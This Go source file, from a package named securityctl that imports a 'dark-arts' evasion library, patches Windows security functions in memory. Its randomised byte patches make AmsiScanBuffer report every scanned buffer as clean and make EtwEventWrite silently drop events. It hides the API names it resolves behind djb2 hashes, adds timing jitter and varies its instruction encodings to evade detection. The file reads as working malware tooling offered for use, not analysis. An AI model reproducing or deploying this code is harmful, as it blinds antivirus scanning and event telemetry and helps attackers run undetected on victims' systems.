//go:build windows && amd64

package securityctl

import (
	"crypto/rand"
	"errors"
	"fmt"
	mrand "math/rand"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"dark-arts/pkg/evasion"
)

const (
	patchLen = 16
	pageRW   = 0x04
	pageRX   = 0x20
)

type funcPatch struct {
	addr     uintptr
	orig     []byte
	patch    []byte
	dllName  string
	funcName string
	origProt uint32 // original page protection from VirtualQuery
}

func init() {
	mrand.Seed(time.Now().UnixNano())
}

func djb2(s string) uint32 {
	h := uint32(5381)
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h = h*33 + uint32(c)
	}
	return h
}

func jitter(min, max time.Duration) {
	if max <= min {
		return
	}
	d := min + time.Duration(mrand.Int63n(int64(max-min)))
	time.Sleep(d)
}

func randomZeroReg() []byte {
	zeroReg := [][]byte{
		{0x33, 0xC0},       // xor eax, eax
		{0x31, 0xC0},       // xor eax, eax (alternative encoding)
		{0x29, 0xC0},       // sub eax, eax
		{0x48, 0x31, 0xC0}, // xor rax, rax
	}
	return zeroReg[mrand.Intn(len(zeroReg))]
}

// randomAmsiPatchBytes generates a patch for AmsiScanBuffer.
//
// AmsiScanBuffer signature (6 parameters):
//
//	HRESULT AmsiScanBuffer(
//	    HAMSICONTEXT amsiContext,   // RCX  (#1)
//	    PVOID buffer,               // RDX  (#2)
//	    ULONG length,               // R8   (#3)
//	    LPCWSTR contentName,        // R9   (#4)
//	    HAMSISESSION amsiSession,   // [rsp+28h] (#5)
//	    AMSI_RESULT *result         // [rsp+30h] (#6)
//	);
//
// The 6th parameter is a POINTER to AMSI_RESULT. We must dereference
// it and write 0 (AMSI_RESULT_CLEAN) to the pointed-to memory.
//
// Patch layout (16 bytes):
//
//	48 8B 44 24 30    mov rax, qword ptr [rsp+0x30]   ; load result pointer
//	C7 00 00 00 00 00 mov dword ptr [rax], 0           ; *result = 0
//	XX XX             zero eax (HRESULT = S_OK)
//	C3                ret
//	CC ...            int3 padding
func randomAmsiPatchBytes() []byte {
	reg := randomZeroReg()
	patch := make([]byte, patchLen)
	// mov rax, qword ptr [rsp+0x30]  — load AMSI_RESULT* from 6th arg
	patch[0] = 0x48
	patch[1] = 0x8B
	patch[2] = 0x44
	patch[3] = 0x24
	patch[4] = 0x30
	// mov dword ptr [rax], 0  — write AMSI_RESULT_CLEAN
	patch[5] = 0xC7
	patch[6] = 0x00
	// bytes 7..10 = 0 (immediate dword 0)
	off := 11
	copy(patch[off:], reg)
	off += len(reg)
	patch[off] = 0xC3
	off++
	for i := off; i < patchLen; i++ {
		patch[i] = 0xCC
	}
	return patch
}

// randomEtwPatchBytes generates a patch for EtwEventWrite.
// EtwEventWrite has 4 parameters; R9 holds PEVENT_DATA_DESCRIPTOR
// UserData — a pointer to event data, NOT an output result. The patch
// must NOT write through R9. It only zeros EAX (ULONG return = 0 =
// ERROR_SUCCESS) and returns.
//
// Coverage note: patching EtwEventWrite disables user-mode ETW event
// reporting through this specific API. Kernel-mode ETW providers,
// NtTraceEvent, and other user-mode ETW wrappers are not affected.
// This is a user-mode telemetry reduction, not a complete ETW kill.
func randomEtwPatchBytes() []byte {
	reg := randomZeroReg()
	patch := make([]byte, patchLen)
	copy(patch, reg)
	patch[len(reg)] = 0xC3
	for i := len(reg) + 1; i < patchLen; i++ {
		patch[i] = 0xCC
	}
	return patch
}

func toPtr(u uintptr) unsafe.Pointer {
	return unsafe.Pointer(uintptr(unsafe.Pointer(nil)) + u)
}

func queryProtection(addr uintptr) (uint32, error) {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	vq := k32.NewProc("VirtualQuery")
	var mbi = struct {
		Size              uintptr
		BaseAddress       uintptr
		AllocationBase    uintptr
		AllocationProtect uint32
		RegionSize        uintptr
		State             uint32
		Protect           uint32
		Type              uint32
	}{}
	mbi.Size = unsafe.Sizeof(mbi)
	r1, _, err := vq.Call(addr&^0xFFF, uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
	if r1 == 0 {
		return 0, fmt.Errorf("securityctl: VirtualQuery failed: %w", err)
	}
	prot := mbi.Protect
	if prot == 0 {
		prot = pageRX
	}
	return prot, nil
}

func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
	jitter(1*time.Millisecond, 5*time.Millisecond)
	k32 := syscall.NewLazyDLL("kernel32.dll")
	loadLibraryW := k32.NewProc("LoadLibraryW")
	freeLibrary := k32.NewProc("FreeLibrary")
	getModuleHandleW := k32.NewProc("GetModuleHandleW")
	namePtr, _ := syscall.UTF16PtrFromString(dllName)

	// Check if the module is already loaded. If it is, LoadLibraryW just
	// increments the refcount and we can safely FreeLibrary later. If it
	// isn't, LoadLibraryW is the one that brings it in and FreeLibrary
	// would unload it — invalidating the resolved address.
	alreadyLoaded, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))

	modBase, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(namePtr)))
	if modBase == 0 {
		return nil, fmt.Errorf("securityctl: LoadLibraryW(%s) failed", dllName)
	}
	jitter(500*time.Microsecond, 2*time.Millisecond)
	fn, err := resolveExportAt(toPtr(modBase), djb2(funcName))
	if err != nil {
		if alreadyLoaded != 0 {
			freeLibrary.Call(modBase)
		}
		return nil, fmt.Errorf("securityctl: resolve %s!%s: %w", dllName, funcName, err)
	}
	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}
	origProt, qperr := queryProtection(uintptr(fn))
	if qperr != nil {
		origProt = pageRX
	}
	// Only release the loader reference if the module was already resident
	// before our LoadLibraryW. Otherwise FreeLibrary would unload the DLL
	// and invalidate the resolved function address.
	if alreadyLoaded != 0 {
		freeLibrary.Call(modBase)
	}
	jitter(100*time.Microsecond, 500*time.Microsecond)
	return &funcPatch{
		addr:     uintptr(fn),
		orig:     orig,
		origProt: origProt,
		dllName:  dllName,
		funcName: funcName,
	}, nil
}

func resolveFuncFromBase(base uintptr, funcName string) (*funcPatch, error) {
	fn, err := resolveExportAt(toPtr(base), djb2(funcName))
	if err != nil {
		return nil, fmt.Errorf("securityctl: resolve %s: %w", funcName, err)
	}
	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}
	origProt, qperr := queryProtection(uintptr(fn))
	if qperr != nil {
		origProt = pageRX
	}
	return &funcPatch{
		addr:     uintptr(fn),
		orig:     orig,
		origProt: origProt,
		funcName: funcName,
	}, nil
}

// resolveFuncFromKnownDlls reads clean on-disk original bytes by mapping
// a fresh view of the KnownDll section. The returned funcPatch.addr is
// set to 0 because the mapping is unmapped before returning — only the
// orig bytes are valid. Callers must NOT use the returned addr for
// patching or reading.
func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
	nt := syscall.NewLazyDLL("ntdll.dll")
	openSection := nt.NewProc("NtOpenSection")
	mapView := nt.NewProc("NtMapViewOfSection")
	closeHandle := nt.NewProc("NtClose")
	unmapView := nt.NewProc("NtUnmapViewOfSection")

	sectionPath := "\\KnownDlls\\" + dllName
	u16 := utf16.Encode([]rune(sectionPath))
	us := &struct {
		Length        uint16
		MaximumLength uint16
		Buffer        *uint16
	}{
		Length:        uint16(len(u16) * 2),
		MaximumLength: uint16(len(u16)*2 + 2),
		Buffer:        &u16[0],
	}
	oa := &struct {
		Length             uint32
		RootDirectory      uintptr
		ObjectName         uintptr
		Attributes         uint32
		SecurityDescriptor uintptr
		SecurityQoS        uintptr
	}{
		Length:     0x30,
		ObjectName: uintptr(unsafe.Pointer(us)),
	}

	var sectionHandle uintptr
	st, _, _ := openSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x0004,
		uintptr(unsafe.Pointer(oa)),
	)
	if st != 0 {
		return nil, fmt.Errorf("securityctl: NtOpenSection(%s): 0x%X", sectionPath, st)
	}

	var base uintptr
	var viewSize uintptr
	st, _, _ = mapView.Call(
		sectionHandle,
		^uintptr(0),
		uintptr(unsafe.Pointer(&base)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		1,
		0,
		0x02,
	)
	if st != 0 {
		closeHandle.Call(sectionHandle)
		return nil, fmt.Errorf("securityctl: NtMapViewOfSection(%s): 0x%X", sectionPath, st)
	}

	fn, err := resolveExportAt(toPtr(base), djb2(funcName))
	if err != nil {
		unmapView.Call(^uintptr(0), base, 0)
		closeHandle.Call(sectionHandle)
		return nil, fmt.Errorf("securityctl: resolve from KnownDlls %s: %w", funcName, err)
	}

	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}

	origProt, qperr := queryProtection(uintptr(fn))
	if qperr != nil {
		origProt = pageRX
	}

	// Unmap the view — we only needed the bytes for orig.
	// addr is set to 0 to indicate this is not a patchable address.
	unmapView.Call(^uintptr(0), base, 0)
	closeHandle.Call(sectionHandle)

	return &funcPatch{
		addr:     0, // intentionally invalid — view was unmapped
		orig:     orig,
		origProt: origProt,
		dllName:  dllName,
		funcName: funcName,
	}, nil
}

func applyPatch(fp *funcPatch) error {
	if len(fp.patch) == 0 {
		return errors.New("securityctl: no patch bytes")
	}
	if len(fp.orig) != patchLen {
		return errors.New("securityctl: original bytes not captured")
	}

	// Validate that the bytes at the target address still match what we
	// read during Initialize. If another component modified the function,
	// we refuse to patch — we'd overwrite an unknown instruction stream.
	current := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		current[i] = *(*byte)(unsafe.Add(toPtr(fp.addr), i))
	}
	for i := 0; i < patchLen; i++ {
		if current[i] != fp.orig[i] {
			return fmt.Errorf("securityctl: target bytes changed at offset %d (expected %02X, found %02X) — refusing to patch", i, fp.orig[i], current[i])
		}
	}

	page := fp.addr &^ 0xFFF
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
		return fmt.Errorf("securityctl: protect RW: %w", err)
	}

	// Write all patch bytes in a tight loop with no jitter. Every
	// nanosecond the page is writable with mixed old/new bytes is a
	// window where another thread executing this function sees an
	// inconsistent instruction stream.
	for i := 0; i < len(fp.patch) && i < patchLen; i++ {
		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
	}

	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
		// Protection restore failed — revert the patch bytes to leave
		// the page in a consistent state (original bytes, original prot).
		for i := 0; i < len(fp.orig) && i < patchLen; i++ {
			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
		}
		return fmt.Errorf("securityctl: protect restore after patch: %w", err)
	}
	return nil
}

func restorePatch(fp *funcPatch) error {
	if len(fp.orig) == 0 {
		return errors.New("securityctl: no original bytes")
	}
	if len(fp.patch) != patchLen {
		return errors.New("securityctl: patch bytes not captured")
	}

	// Check whether the function currently contains our patch. If
	// another component already modified the bytes, we must not
	// blindly overwrite with our saved originals — that would
	// destroy the other component's modification.
	current := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		current[i] = *(*byte)(unsafe.Add(toPtr(fp.addr), i))
	}
	alreadyPatched := true
	for i := 0; i < patchLen; i++ {
		if current[i] != fp.patch[i] {
			alreadyPatched = false
			break
		}
	}
	if !alreadyPatched {
		// Bytes don't match our patch — either already restored or
		// modified by something else. Don't touch them.
		return nil
	}

	page := fp.addr &^ 0xFFF
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
		return fmt.Errorf("securityctl: protect RW: %w", err)
	}

	// Write original bytes in a tight loop — same atomicity concern
	// as applyPatch.
	for i := 0; i < len(fp.orig); i++ {
		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
	}

	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
		// Protection restore failed — re-apply patch so the page is
		// in a consistent (patched) state rather than writable with
		// original bytes.
		for i := 0; i < len(fp.patch) && i < patchLen; i++ {
			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
		}
		return fmt.Errorf("securityctl: protect restore after unpatch: %w", err)
	}
	return nil
}

func resolveExportAt(base unsafe.Pointer, want uint32) (unsafe.Pointer, error) {
	nt := unsafe.Add(base, uintptr(*(*uint32)(unsafe.Add(base, 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	expRVA := *(*uint32)(unsafe.Add(opt, 0x70))
	if expRVA == 0 {
		return nil, errors.New("export directory missing")
	}
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	exp := unsafe.Add(base, uintptr(expRVA))
	numNames := *(*uint32)(unsafe.Add(exp, 0x18))
	numFuncs := *(*uint32)(unsafe.Add(exp, 0x14))
	if numNames == 0 || numNames > 1<<20 || numFuncs == 0 {
		return nil, errors.New("malformed export directory")
	}
	funcsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x1C)))
	namesRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x20)))
	ordsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x24)))
	// Bounds-check that the export arrays are within the image.
	if sizeOfImage > 0 {
		if uintptr(expRVA) >= sizeOfImage {
			return nil, errors.New("export directory outside image")
		}
		endNames := namesRVA + uintptr(numNames)*4
		endOrds := ordsRVA + uintptr(numNames)*2
		endFuncs := funcsRVA + uintptr(numFuncs)*4
		if endNames > sizeOfImage || endOrds > sizeOfImage || endFuncs > sizeOfImage {
			return nil, errors.New("export array extends beyond image")
		}
	}
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Add(base, namesRVA+uintptr(i)*4))
		if nameRVA == 0 {
			continue
		}
		if sizeOfImage > 0 && uintptr(nameRVA) >= sizeOfImage {
			continue // skip malformed name entry
		}
		if hashExportName(unsafe.Add(base, uintptr(nameRVA))) == want {
			ord := uint32(*(*uint16)(unsafe.Add(base, ordsRVA+uintptr(i)*2)))
			if ord >= numFuncs {
				return nil, errors.New("export ordinal out of range")
			}
			fnRVA := uintptr(*(*uint32)(unsafe.Add(base, funcsRVA+uintptr(ord)*4)))
			if fnRVA == 0 {
				return nil, errors.New("export slot empty")
			}
			if sizeOfImage > 0 && fnRVA >= sizeOfImage {
				return nil, errors.New("export outside image")
			}
			fn := unsafe.Add(base, fnRVA)
			// Verify 16 readable bytes at the function address are within
			// the mapped image (not just that the RVA is in range).
			if sizeOfImage > 0 && fnRVA+uintptr(patchLen) > sizeOfImage {
				return nil, errors.New("export function extends beyond image")
			}
			return fn, nil
		}
	}
	return nil, errors.New("export not found")
}

func hashExportName(p unsafe.Pointer) uint32 {
	h := uint32(5381)
	for {
		c := *(*byte)(p)
		if c == 0 {
			break
		}
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h = h*33 + uint32(c)
		p = unsafe.Add(p, 1)
	}
	return h
}

func randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}
